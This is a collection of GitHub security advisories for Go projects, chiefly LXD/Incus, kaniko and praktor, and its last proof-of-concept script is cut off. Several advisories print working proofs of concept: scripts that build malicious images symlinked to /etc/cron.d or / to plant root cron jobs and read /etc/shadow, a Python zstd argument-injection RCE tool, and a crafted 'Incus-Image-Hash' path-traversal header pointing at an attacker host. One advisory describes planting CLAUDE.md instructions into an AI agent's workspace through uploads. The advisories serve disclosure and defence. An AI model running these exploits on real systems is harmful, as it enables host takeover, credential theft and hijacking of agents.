### GHSA-48v2-6jcm-fc99 — praktor: Path traversal in Telegram file uploads allows writing outside the agent workspace uploads/ directory (stored instruction injection)
- Aliases: CVE-2026-62331 | Published: 2026-11-03 | Modified: 2026-11-03 | Severity: HIGH
- CWE: CWE-22
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N`
- Affected Go/github.com/mtzanidakis/praktor: introduced:0 fixed:0.9.1

### Impact

A remote Telegram user can write files to arbitrary paths inside an agent's persistent workspace volume (`praktor-wk-<workspace>`, mounted at `/workspace/agent`), escaping the documented `uploads/` directory.

The attacker controls the Telegram document filename, which was concatenated into the destination path without sanitization (`internal/telegram/bot.go`, at both upload sites) and resolved with `path.Join`, which collapses `../` sequences. A filename like `../../../CLAUDE.md` resolved to the root of the agent workspace volume, outside `uploads/`.

Because the agent workspace is the persistent working directory the Claude agent reads from and operates on across runs, writing outside `uploads/` lets an attacker plant or overwrite files the agent later consumes — e.g. `CLAUDE.md`, agent instruction/skill/hook files, or other config under `/workspace/agent`. This turns a file upload into a stored injection into the agent's instruction/execution surface (CWE-22 path traversal escalating to stored instruction injection).

### Reachability

By default the bot has no user allowlist (`allow_from: []` means "allow all"), so the only precondition is that a user can message the bot. No authentication or prior privilege is required.

### Affected versions

Through `v0.9.0` (and HEAD `3902d29`).

### Patched versions

`v0.9.1`, containing PR #228.

### Workarounds

Restrict `telegram.allow_from` to trusted user IDs to limit who can send uploads to the bot. Upgrading to `v0.9.1` is the recommended fix.

### Fix (defense in depth)

- `internal/telegram/bot.go`: apply `path.Base()` to the attacker-controlled filename at both upload sites, stripping directory components and `..`.
- `internal/container/manager.go`: `WriteVolumeBytes` now rejects any path that escapes `/vol` after `path.Join`, protecting future callers.

### Credit

Reported privately by [tonghuaroot](https://github.com/tonghuaroot), who provided a detailed root-cause analysis, a deployed end-to-end proof of concept against the real `container.Manager`, and fix verification.

### GHSA-hhf9-qw4v-72xp — lxd allows Cross-guest volume hijack via DevLXD device patch
- Aliases: CVE-2026-12411 | Published: 2026-11-05 | Modified: 2026-11-05 | Severity: HIGH
- CWE: CWE-639, CWE-862
- CVSS_V3: `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`
- Affected Go/github.com/canonical/lxd: introduced:0.0.0-20250721152936-fe86ceb2c3fa fixed:0.0.0-20260626085133-7cb96ac80a6d

### Summary

A guest can mount another guest's custom storage volume over `/dev/lxd` and read or write its contents without owning it. The DevLXD storage API blocks access to volumes you don't own, but the instance device-update path that attaches a volume to a container without checks ownership. Any guest in a project with `security.devlxd.management.volumes` enabled can attach a volume belonging to a different guest by naming it in a device `PATCH`, giving one tenant full read and write access to another tenant's volume data.

### Details

Volumes created over DevLXD get `volatile.devlxd.owner` set to the calling identity. The storage handlers enforce it on `GET`/`PUT`/`DELETE` ([`isDevLXDVolumeOwner`, lxd/devlxd_storage.go:359](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_storage.go#L359)) and on volume-copy sources ([devlxd_storage.go:286](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_storage.go#L286)). The device-attach path does not.

`devLXDInstancePatchHandler` ([lxd/devlxd_instances.go:88](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_instances.go#L88)) passes the guest's device map to `generateDevLXDInstanceDevices` ([devlxd_instances.go:178](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_instances.go#L178)). For a device that isn't already on the instance, the only check is `isDeviceAccessible(device)`:

```go
if (exists && !isOwned) || (!isDeviceAccessible(device)) 
```

`exists` is false for a newly added device, so `isDeviceAccessible` is the whole gate. It resolves to `newDevLXDDeviceAccessValidator` ([devlxd_instances.go:250](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_instances.go#L250)), which is `diskDeviceAllowed && filters.IsCustomVolumeDisk(device)`. `IsCustomVolumeDisk` ([lxd/device/filters/disk.go:28](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/device/filters/disk.go#L28)) checks the device shape only: `type=disk`, non-empty `source`, non-empty `pool`. It never loads the `(pool, source)` volume or compares its owner to the caller.

The handler then sets `volatile.<dev>.devlxd.owner` to the caller and issues an in-process `PATCH` to `instancePatch` ([lxd/instance_patch.go:55](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/instance_patch.go#L55)). That call skips the HTTP access handler and runs only project quota checks (`limits.AllowInstanceUpdate`, [instance_patch.go:215](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/instance_patch.go#L215)) before `c.Update`. The disk device's `validateConfig` confirms the volume exists but does no ownership or RBAC check. A guest can therefore point a new disk device at any custom volume in its project and LXD mounts it. The recorded device owner becomes the attacker while the volume's `volatile.devlxd.owner` still names the victim.

### PoC

Built from source at HEAD `d29ece6284` (reports as `6.8`, API extension `devlxd_volume_management`); single host, `dir` pool, default project.

Host setup, two guests with separate DevLXD identities, each scoped to edit only its own instance:

```bash
lxc launch images:alpine/edge guesta -c security.devlxd=true -c security.devlxd.management.volumes=true
lxc launch images:alpine/edge guestb -c security.devlxd=true -c security.devlxd.management.volumes=true
lxc exec guesta -- apk add --no-cache curl ; lxc exec guestb -- apk add --no-cache curl

for g in a b; do
  lxc auth identity create devlxd/id$g
  lxc auth group create g$g
  lxc auth group permission add g$g project default can_view
  lxc auth group permission add g$g project default can_view_storage_volumes
  lxc auth group permission add g$g project default can_create_storage_volumes
  lxc auth group permission add g$g instance guest$g can_view project=default
  lxc auth group permission add g$g instance guest$g can_edit project=default
  lxc auth identity group add devlxd/id$g g$g
done
TOKEN_A=$(lxc auth identity token issue devlxd/ida --quiet)
TOKEN_B=$(lxc auth identity token issue devlxd/idb --quiet)
```

With `devlxd` defined as `lxc exec <c> -- curl --unix-socket /dev/lxd/sock -H "Authorization: Bearer <tok>" ...`:

```bash
devlxd guesta $TOKEN_A POST /1.0/storage-pools/default/volumes/custom '{"name":"vola","type":"custom","config":{}}'
devlxd guesta $TOKEN_A PATCH /1.0/instances/guesta '{"devices":{"mine":{"type":"disk","pool":"default","source":"vola","path":"/mnt/mine"}}}'
lxc exec guesta -- sh -c 'echo TOP-SECRET-OWNED-BY-A > /mnt/mine/secret.txt'
devlxd guesta $TOKEN_A PATCH /1.0/instances/guesta '{"devices":{"mine":null}}'

devlxd guestb $TOKEN_B GET /1.0/storage-pools/default/volumes/custom/vola     # HTTP 404

devlxd guestb $TOKEN_B PATCH /1.0/instances/guestb '{"devices":{"stolen":{"type":"disk","pool":"default","source":"vola","path":"/mnt/stolen"}}}'   # HTTP 200

lxc exec guestb -- cat /mnt/stolen/secret.txt                       
lxc exec guestb -- sh -c 'echo PWNED-BY-B > /mnt/stolen/b_was_here.txt'
```

`lxc storage volume get default vola volatile.devlxd.owner` returns guesta's identity; `lxc config device get guestb stolen source` returns `vola`.

### Impact

Broken access control across tenants. It affects operators running untrusted guests in a shared LXD project with `security.devlxd.management.volumes` enabled. Any such guest can read and overwrite every custom volume owned by the other guests in that project. The attacker needs only a normal DevLXD identity scoped to its own instance, and the victim does nothing. Volume names that aren't already known can be recovered by probing, since an attachable volume returns `200` and a missing one returns a not-found error.

- https://github.com/canonical/lxd/pull/18585 [WEB]
- https://github.com/canonical/lxd/commit/752e25cfb849a349ff08939ce02747ef4d4e69cc [WEB]

### GHSA-5q7h-w9jf-cx97 — kaniko can send the build's Azure (Entra ID) access token to lookalike ACR registry hosts
- Aliases: CVE-2026-105769 | Published: 2026-11-05 | Modified: 2026-11-05 | Severity: CRITICAL
- CWE: CWE-346, CWE-522
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`
- Affected Go/github.com/chainguard-dev/kaniko: introduced:0 fixed:1.25.20

### Summary

kaniko before v1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to a registry host an attacker controls. A Dockerfile that references an image on a lookalike host, such as `FROM x.azurecr.io.attacker.com/img`, is enough. The build needs no `RUN` instruction and never has to push.

The flaw is in the Azure Container Registry (ACR) credential helper, `github.com/chrismellard/docker-credential-acr-env`. kaniko links it into the executor and warmer (the built-in helper) and also builds it as the standalone `docker-credential-acr-env` binary. The helper decides whether a host is an ACR registry with an unanchored regex, so any hostname that contains `.azurecr.io` (or `.azurecr.cn`, `.azurecr.de`, `.azurecr.us`) passes. The upstream module is unmaintained and has no fixed release. The Go vulnerability database tracks the upstream flaw as [GO-2026-6225](https://pkg.go.dev/vuln/GO-2026-6225).

### Who is affected

You are affected if you run kaniko before v1.25.20 on Dockerfiles, or build arguments, that you don't fully control, in an environment where the helper can get an Azure identity:

- service principal credentials in the environment (`AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET`, `AZURE_TENANT_ID`)
- a federated workload identity token (`AZURE_FEDERATED_TOKEN` or `AZURE_FEDERATED_TOKEN_FILE`, with `AZURE_CLIENT_ID` and `AZURE_TENANT_ID`), as injected by AKS workload identity
- a managed identity, through the Azure Instance Metadata Service (for example on an AKS node or Azure VM) or `MSI_ENDPOINT`

You do not need to use ACR, or configure the helper, to be affected. kaniko consults the built-in helper for any registry that has no credentials in your Docker config and is not a Google or Amazon ECR registry, and every lookalike host falls in that set. That covers base images in `FROM` lines and images in `COPY --from=<image>`. kaniko asks for credentials before it contacts the registry, so the attacker's registry doesn't need to request authentication.

If your Docker `config.json` sets `"credsStore": "acr-env"`, the standalone binary is consulted for every registry as well. Before v1.25.20 this setting broke pulls from non-ACR registries, so it is uncommon.

### Impact

The helper puts the token in both the `Authorization: Bearer` header and the `access_token` form field of a POST to `https://<host>/oauth2/exchange`, so the attacker receives a live access token for Azure Resource Manager. Until it expires, the attacker can use it against Azure Resource Manager with the identity's role assignments. They can also exchange it, as the helper does, at the `/oauth2/exchange` endpoint of any real ACR registry the identity can access, and so obtain registry credentials. If the identity has `AcrPush` or higher, the attacker can push images to your registries.

### Patches

Fixed in [v1.25.20](https://github.com/chainguard-forks/kaniko/releases/tag/v1.25.20) by [#495](https://github.com/chainguard-forks/kaniko/pull/495). kaniko now carries a patched copy of the helper under `third_party/docker-credential-acr-env`, which the executor, the warmer and the `docker-credential-acr-env` binary built by `deploy/Dockerfile` all use. The patched helper accepts a host only if it is exactly `host[:port]` and the hostname is `mcr.microsoft.com` or a well-formed name ending in `.azurecr.io`, `.azurecr.cn`, `.azurecr.de` or `.azurecr.us`. For any other host it reports "credentials not found" without requesting a token.

This repository publishes no binaries or images. Rebuild the executor, the warmer and `docker-credential-acr-env` from v1.25.20 or later. If you import kaniko as a Go module, update `github.com/chainguard-dev/kaniko` to v1.25.20 or later.

From v1.25.20, kaniko no longer depends on `github.com/chrismellard/docker-credential-acr-env`, so scanners stop reporting GO-2026-6225 for it.

### Workarounds

If you can't upgrade, don't let untrusted builds reach an Azure identity:

- Remove Azure credentials, federated tokens, `MSI_ENDPOINT` and `MSI_SECRET` from the build environment, and block access to the Instance Metadata Service (`169.254.169.254`) from build pods.
- If you don't rely on kaniko's built-in ACR authentication, set `AZURE_ENVIRONMENT` to a value that names no Azure cloud, such as `AZURE_ENVIRONMENT=none`, in the kaniko container. The helper then fails before requesting any token, and kaniko no longer authenticates to ACR through it.

Also, if you set `"credsStore": "acr-env"`, replace it with per-host `credHelpers` entries for your own ACR registries. On its own this closes only the standalone-binary path.

If you have built untrusted Dockerfiles with an Azure identity available, treat any access token issued to that identity during those builds as compromised. A leaked token stays valid until it expires, and rotating the identity's credentials does not revoke it. Review the identity's Entra ID sign-in logs and Azure activity logs for that period, especially for ACR pushes, role-assignment changes and key or secret listings, and rotate any secrets the identity could read through Azure Resource Manager, such as storage account keys.

### Credit

Reported by Martin Zihlmann ([@mzihlmann](https://github.com/mzihlmann)) of osscontainertools.

- https://github.com/chrismellard/docker-credential-acr-env/issues/21 [WEB]

### GHSA-5w5g-j6hw-6p8f — OSAC operator: Kubeconfig credential-plugin execution and SSRF in console proxy
- Aliases: CVE-2026-62284 | Published: 2026-11-06 | Modified: 2026-11-06 | Severity: HIGH
- CWE: CWE-94
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`
- Affected Go/github.com/osac-project/osac-operator: introduced:0 fixed:0.0.4

### Impact

 The console-proxy's RemoteConfigResolver parses kubeconfig data from Kubernetes Secrets using clientcmd.RESTConfigFromKubeConfig without sanitizing the resulting rest.Config. A kubeconfig containing an exec
  plugin stanza (under users[].user.exec) is faithfully preserved. When rest.TransportFor later builds the HTTP transport for the upstream WebSocket connection, client-go invokes the exec plugin — spawning an
  arbitrary process as the osac-console-proxy service account.

  This allows remote code execution inside the console-proxy pod for any principal that can create or modify a Secret with the label osac.openshift.io/remote-cluster-kubeconfig: "true" in a namespace where the
  console-proxy has Secret read access (governed by its RoleBinding). A secondary vector exists via attacker-controlled clusters[].server, enabling server-side request forgery (SSRF) from within the proxy pod.

  Affected configurations: any deployment using remote or auto VM cluster mode (the default). Deployments using local mode exclusively are not affected, as they do not read kubeconfig Secrets.

### Patches


  The fix is two lines in internal/consoleproxy/config_resolver.go, applied immediately after clientcmd.RESTConfigFromKubeConfig returns:

  config.ExecProvider = nil
  config.AuthProvider = nil

  This is patched in `0.0.4`. Users should upgrade to the first release containing this patch once available.

### Workarounds

  - Restrict Secret creation in the namespace where the osac-console-proxy-secret-reader RoleBinding is deployed. Ensure only trusted principals (cluster admins, operator service accounts) can create or modify
  Secrets there.
  - Switch to local VM cluster mode (--vm-cluster-mode=local) if the KubeVirt VMs run on the same cluster as the proxy. This bypasses the Secret-based kubeconfig lookup entirely.
  - Use an admission webhook or OPA policy to reject Secrets containing exec: or auth-provider: stanzas in the kubeconfig data within the affected namespace.

### GHSA-9j25-mm2h-2f76 — LXD has arbitrary file write on host via `exec-output` symlink in crafted image
- Aliases:  | Published: 2026-11-06 | Modified: 2026-11-06 | Severity: CRITICAL
- CWE: CWE-73
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- Affected Go/github.com/canonical/lxd: introduced:0 fixed:0.0.0-20260626085134-124f90100640

Reported from https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv

### Summary

The `record-output` parameter of the `/instances/$name/exec` endpoint
stores the output of the command in the `exec-output` directory of the
instance. If `exec-output` is a symlink, file named `exec_UUID.stdout`
and `exec_UUID.stderr` can be written to an arbitrary location where
the `.stdout` file will contain arbitrary content. This behavior can be
abused for arbitrary command execution.


### Details

When an image is unpacked, top-level symlinks are extracted as is;
allowing for `exec-output` to be placed on disk. In `instance_exec.go`,
`os.Mkdir` continues of `exec-output` exists and `os.OpenFile` follows
the `exec-output` symlink.


### PoC

Below, we place the `exec_UUID.stdout` file in `/etc/cron.d` on
the host for arbitrary command execution.

```
#!/bin/sh
# usage: $0 existing-imagefp
set -eu

basefp="${1}"

die() {
        printf '%s' "${@}" >&2
        exit 1
}

command -v curl >/dev/null 2>&1 || die 'error: curl not found\n'
command -v python3 >/dev/null 2>&1 || die 'error: python3 not found\n'

tmpdir=$(mktemp -d)
cleanup() {
        rm -rf "${tmpdir}"
}
trap cleanup EXIT INT QUIT TERM HUP


# insert exec-output symlink

incus image export "${basefp}" "${tmpdir}/img"

mkdir "${tmpdir}/repack"
cd "${tmpdir}/repack"

xz -cd "${tmpdir}/img" | tar -f- -vx

rm -rf exec-output
ln -s /etc/cron.d exec-output

tar -f- -c * | gzip -c9 >"${tmpdir}/img"

cd - >/dev/null
incus image import "${tmpdir}"/img* --alias afw-exec-output


# Launch container, exec with record-output via REST API
incus launch afw-exec-output afw-exec-output
incus wait afw-exec-output ip

OP=$(curl -s --unix-socket /var/lib/incus/unix.socket \
  -X POST -H 'Content-Type: application/json' \
  -d '{"command":["/bin/sh","-c","echo * * * * * root id'"'>'"'/afw-exec-output"],"record-output":true}' \
  "lxd/1.0/instances/afw-exec-output/exec" | python3 -c "import sys,json;print(json.load(sys.stdin)['operation'])")

curl -s --unix-socket /var/lib/incus/unix.socket "$OP/wait?timeout=30" >/dev/null

#find /etc/cron.d/exec_* -exec cat {} \;
```

### Impact

Constrained file creation in an arbitrary directory on the host via
via an unsanitized symlink; possibly leading to command execution.

References:

### GHSA-jpf8-86f3-wp38 — LXD has arbitrary file read+write on host via templates/ symlink in malicious image
- Aliases:  | Published: 2026-11-06 | Modified: 2026-11-06 | Severity: CRITICAL
- CWE: CWE-73
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- Affected Go/github.com/canonical/lxd: introduced:0 fixed:0.0.0-20260203144152-d1c8ba15d160

Reported from https://github.com/lxc/incus/security/advisories/GHSA-vxp5-584q-c479

### Summary

A specially crafted image can be used to read or create/write arbitrary
files on the host; possibly leading to arbitrary command execution.


### Details

For container images, `internal/server/storage/utils.go` calls
`archive.Unpack(imageFile, destPath, ...)`. The tar extraction path in
`shared/archive/archive.go` excludes device nodes, but it does not
reject a top-level `templates` symlink.

In practice, this allows a malicious actor to access an arbitrary
directory and edit arbitrary files in it.


### PoC

Below, we map the templates directory to `/etc/cron.d` on the host, but
it can be mapped anywhere. We then create a cronjob to run `id` as root.

```
#!/bin/sh
set -eu

tmpdir=$(mktemp -d)
cleanup() {
    rm -rf "${tmpdir}"
}
trap cleanup EXIT INT QUIT TERM HUP

mkdir -p "${tmpdir}/img/rootfs"
ln -s /etc/cron.d "${tmpdir}/img/templates"
cat<<__EOF__>"${tmpdir}/img/metadata.yaml"
architecture: x86_64
creation_date: 1
properties:
  description: PoC templates symlink host afrw
__EOF__

cd "${tmpdir}/img"
tar --owner=0 --group=0 -f- -c * >../afrw-image-templates-symlink.tar
incus image import ../afrw-image-templates-symlink.tar --alias afrw-image-templates-symlink
incus init afrw-image-templates-symlink afrw-image-templates-symlink

incus config template ls afrw-image-templates-symlink

# read
#incus config template show afrw-image-templates-symlink $FILENAME

# write
printf "* * * * * root sh -c 'id>/pwned'\n" | incus config template create afrw-image-templates-symlink poc-32
#incus config template edit afrw-image-templates-symlink poc
```

### Impact

Arbitrary file read and write on the host via unsanitized symlink;
possibly leading to command execution.

### GHSA-vghh-5rfx-xhq8 — LXD has arbitrary file read+write on host via rootfs/ symlink in malicious image
- Aliases:  | Published: 2026-11-06 | Modified: 2026-11-06 | Severity: CRITICAL
- CWE: CWE-73
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- Affected Go/github.com/canonical/lxd: introduced:0 fixed:0.0.0-20260630083100-c5184be310b1

Reported from https://github.com/lxc/incus/security/advisories/GHSA-2q3f-q5pq-g8wv

### Summary

A specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.


### Details

Incus validates an image as soon as it sees a normal `metadata.yaml` and
a `rootfs/` entry, but full extraction can later process a duplicate top-level
`rootfs` symlink. Later, the stopped-container file API opens
`d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to
it.

```
metadata.yaml
rootfs/
rootfs -> /
```

In practice, this allows a malicious actor to access the host's filesystem
with root privileges.


### PoC

Below, we map the container's rootfs to `/` on the host, but it can be
mapped anywhere. We then retrieve the host's `/etc/shadow` file and
create a file in `/`.

```
#!/bin/sh
set -eu

tmpdir=$(mktemp -d)
cleanup() {
    rm -rf "${tmpdir}"
}
trap cleanup EXIT INT QUIT TERM HUP

mkdir -p "${tmpdir}/img/rootfs"
cat<<__EOF__>"${tmpdir}/img/metadata.yaml"
architecture: x86_64
creation_date: 1
properties:
  description: PoC rootfs symlink host afrw
__EOF__

cd "${tmpdir}/img"
tar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar

# inject rootfs symlink
rmdir rootfs
ln -s / rootfs
tar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs


incus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink
incus init afrw-rootfs-symlink afrw-rootfs-symlink


# read
incus file pull afrw-rootfs-symlink/etc/shadow "${tmpdir}/shadow"
cat "${tmpdir}/shadow"

# write
printf 'afrw-rootfs-symlink\n' >"${tmpdir}/afrw-rootfs-symlink"
incus file push "${tmpdir}/afrw-rootfs-symlink" afrw-rootfs-symlink/
```

### Impact

Arbitrary file read and write on the host via unsanitized symlink;
possibly leading to command execution.

### GHSA-fmc8-p6q7-75cc — LXD has argument injection in backup compression algorithm leading to AFW and ACE
- Aliases:  | Published: 2026-11-06 | Modified: 2026-11-06 | Severity: CRITICAL
- CWE: CWE-20
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- Affected Go/github.com/canonical/lxd: introduced:0 fixed:0.0.0-20260630083100-c5184be310b1

Reported from  https://github.com/lxc/incus/security/advisories/GHSA-v6mj-8pf4-hhw4

### Summary

Improper validation of user-provided backup compression algorithm leads to
argument injection in the constructed command line. This leads to an
arbitrary file write on the host, possibly leading to arbitrary command
execution.


### Details

Incus validates `compression_algorithm` by parsing it into fields and checking
only the first token against an allowlist:

```go
fields, err := shellquote.Split(value)
...
if !slices.Contains([]string{"bzip2", "gzip", "lz4", "lzma", "pigz", "pzstd", "pxz", "tar2sqfs", "xz", "zstd"}, fields[0]) {
    return fmt.Errorf("Compression algorithm %q isn't currently supported", fields[0])
}
_, err = exec.LookPath(fields[0])
```

Extra arguments are not rejected. `compressFile()` then prepends `-c` and
passes the remaining user-supplied fields to the compressor:

```go
args := []string{"-c"}
if len(fields) > 1 {
    args = append(args, fields[1:]...)
}
cmd := exec.Command(fields[0], args...)
cmd.Stdin = infile
cmd.Stdout = outfile
```

With a value like:

```text
zstd -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload
```

the daemon executes the equivalent of:

```text
zstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload
```

### PoC

```
python3 poc.py \
	--insecure --url https://remote-incus:8443 \
	--cert ~/.config/incus/client.crt --key ~/.config/incus/client.key \
	--instance c01 \
	--execute --yes-i-understand-this-writes-host-file
```

The following was generated by an LLM model.

```
#!/usr/bin/env python3
"""Short remote Incus backup compression zstd cron RCE PoC.

Dry-run is the default.  --execute uploads a cron payload into an instance and
then asks Incus for a direct backup with a zstd argument-injection compressor:

    zstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- <source>

The direct backup may fail after zstd runs; the host file write is the primitive.
Use only on an authorized Incus server.
"""

from __future__ import annotations

import argparse
import json
import os
import shlex
import sys
import urllib.parse
from pathlib import PurePosixPath
from typing import Any

import requests


def q(value: str) -> str:
    return urllib.parse.quote(value, safe="")


def api(base: str, endpoint: str, **params: str) -> str:
    return base.rstrip("/") + endpoint + ("?" + urllib.parse.urlencode(params) if params else "")


def project_instance(project: str, instance: str) -> str:
    return instance if project == "default" else f"{project}_{instance}"


def clean_guest_path(path: str) -> str:
    if not path.startswith("/"):
        raise ValueError("--guest-path must be absolute")
    if ".." in PurePosixPath(path).parts:
        raise ValueError("--guest-path must not contain '..'")
    return os.path.normpath("/" + path.lstrip("/")).lstrip("/")


def source_path(args: argparse.Namespace) -> str:
    if args.source_host_path:
        return args.source_host_path
    return os.path.join(
        args.incus_dir,
        "storage-pools",
        args.pool,
        args.storage_kind,
        project_instance(args.project, args.instance),
        "rootfs",
        clean_guest_path(args.guest_path),
    )


def cron(command: str) -> bytes:
    return f"* * * * * root /bin/sh -c {shlex.quote(command)}\n".encode()


def session(args: argparse.Namespace) -> requests.Session:
    s = requests.Session()
    s.verify = False if args.insecure else (args.cacert or True)
    if args.cert or args.key:
        s.cert = (args.cert, args.key)
    if args.token:
        s.headers["Authorization"] = "Bearer " + args.token
    s.headers["User-Agent"] = "incus-zstd-backup-rce-poc"
    if args.insecure:
        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
    return s


def check(resp: requests.Response, what: str) -> requests.Response:
    if resp.status_code >= 400:
        try:
            detail: Any = resp.json()
        except Exception:
            detail = resp.text[:2048]
        raise RuntimeError(f"{what} failed: HTTP {resp.status_code}: {detail}")
    return resp


def upload(s: requests.Session, args: argparse.Namespace, payload: bytes) -> None:
    url = api(args.url, f"/1.0/instances/{q(args.instance)}/files", project=args.project, path=args.guest_path)
    headers = {
        "Content-Type": "application/octet-stream",
        "X-Incus-type": "file",
        "X-Incus-write": "overwrite",
        "X-Incus-uid": "0",
        "X-Incus-gid": "0",
        "X-Incus-mode": "0644",
    }
    print(f"[*] uploading cron payload to {args.instance}:{args.guest_path}")
    check(s.post(url, data=payload, headers=headers, timeout=args.timeout), "payload upload")


def trigger_backup(s: requests.Session, args: argparse.Namespace, body: dict[str, Any]) -> None:
    url = api(args.url, f"/1.0/instances/{q(args.instance)}/backups", project=args.project)
    print("[*] sending direct backup request")
    resp = s.post(
        url,
        data=json.dumps(body).encode(),
        headers={"Accept": "application/octet-stream", "Content-Type": "application/json"},
        timeout=args.timeout,
        stream=True,
    )
    print(f"[*] backup HTTP {resp.status_code}")
    resp.close()
    if resp.status_code >= 400:
        print("[*] HTTP error after compressor launch is possible; check whether the cron file was written")


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Remote Incus zstd backup-compression cron RCE PoC")
    p.add_argument("--url", required=True, help="https://host:8443")
    p.add_argument("--cert", help="client certificate PEM")
    p.add_argument("--key", help="client private key PEM")
    p.add_argument("--cacert", help="CA certificate PEM")
    p.add_argument("--token", help="bearer token")
    p.add_argument("--insecure", action="store_true", help="disable TLS verification")
    p.add_argument("--timeout", type=int, default=180)

    p.add_argument("--project", default="default")
    p.add_argument("--instance", required=True)
    p.add_argument("--pool", default="default")
    p.add_argument("--storage-kind", choices=["containers", "virtual-machines"], default="containers")
    p.add_argument("--incus-dir", default="/var/lib/incus")
    p.add_argument("--guest-path", default="/incus-zstd-cron")
    p.add_argument("--source-host-path", help="override daemon-readable host path for the staged payload")
    p.add_argument("--cron-path", default="/etc/cron.d/incus-zstd-rce")
    p.add_argument("--command", default="date >/incus-zstd-rce; id >>/incus-zstd-rce")

    p.add_argument("--execute", action="store_true", help="stage payload and send backup request")
    p.add_argument("--yes-i-understand-this-writes-host-file", action="store_true", help="required with --execute")
    args = p.parse_args()

    if urllib.parse.urlparse(args.url).scheme != "https":
        p.error("--url must use https")
    if bool(args.cert) != bool(args.key):
        p.error("--cert and --key must be supplied together")
    if args.execute and not args.yes_i_understand_this_writes_host_file:
        p.error("--execute requires --yes-i-understand-this-writes-host-file")
    try:
        clean_guest_path(args.guest_path)
    except ValueError as exc:
        p.error(str(exc))

    args.url = args.url.rstrip("/")
    return args


def main() -> int:
    args = parse_args()
    src = source_path(args)
    payload = cron(args.command)
    compressor = f"zstd -d -f --pass-through -o {shlex.quote(args.cron_path)} -- {shlex.quote(src)}"
    body = {"compression_algorithm": compressor, "instance_only": True}

    print("[*] target:", args.url)
    print("[*] project:", args.project)
    print("[*] instance:", args.instance)
    print("[*] source host path:", src)
    print("[*] cron path:", args.cron_path)
    print("[*] payload:", payload.decode().rstrip())
    print("[*] backup body:", json.dumps(body, sort_keys=True))

    if not args.execute:
        print("[*] dry run only; add --execute and the confirmation flag to act")
        return 0

    s = session(args)
    upload(s, args, payload)
    trigger_backup(s, args, body)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except BrokenPipeError:
        raise SystemExit(1)
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
```


### Impact

Improperly validated compression algorithm argument leads to argument
injection leading to arbitrary file write with `zstd` and possibly
arbitrary command execution.

### GHSA-pjff-c2wc-f6jm — LXD has arbitrary file write on client due to trusted image hash
- Aliases:  | Published: 2026-11-06 | Modified: 2026-11-06 | Severity: CRITICAL
- CWE: CWE-20
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- Affected Go/github.com/canonical/lxd: introduced:0 fixed:0.0.0-20260630083100-c5184be310b1

Reported from https://github.com/lxc/incus/security/advisories/GHSA-f6m5-xw2g-xc4x

### Summary

An arbitrary file write exists in the Incus client when a malicious image
server returns a crafted `Incus-Image-Hash` header. This can lead to
arbitrary command execution as root on the server.


### Details

- `cmd/incusd/images.go:611-684` handles `source.type=url` by HEADing the user-supplied URL, reading `Incus-Image-Hash` and `Incus-Image-URL`, and passing them to `imageDownload()` as `Alias`
 and `Server`.
- `cmd/incusd/daemon_images.go:91-92` defaults `fp` to the caller-controlled alias string.
- `cmd/incusd/daemon_images.go:333-335` builds `destName := filepath.Join(destDir, fp)`.
- `cmd/incusd/daemon_images.go:469-523` enters the `direct` protocol branch, opens `destName` with `os.Create()`, and copies the HTTP response into that file.
- `cmd/incusd/daemon_images.go:528-532` validates the SHA-256 only after the file has already been created and populated.
- `cmd/incusd/daemon_images.go:337-344` cleanup only runs after the copy returns; a slow or held response extends the arbitrary-write window.

A malicious image server returning something along the following will cause
the arbitrary file write.

```
Incus-Image-Hash: ../../../../etc/cron.d/incus-direct-image-url-rce
Incus-Image-URL: http://attacker/payload
```


### PoC

The script below creates a malicious image server and requests an Incus
server to fetch the image. File write occurs when the image is unpacked.

The following script was generated by an LLM.

```
#!/usr/bin/env python3
"""Direct image URL hash path traversal to transient host cron write.

For `source.type=url`, Incus first HEADs an attacker-controlled URL and trusts
the `Incus-Image-Hash` header as the expected fingerprint. The direct download
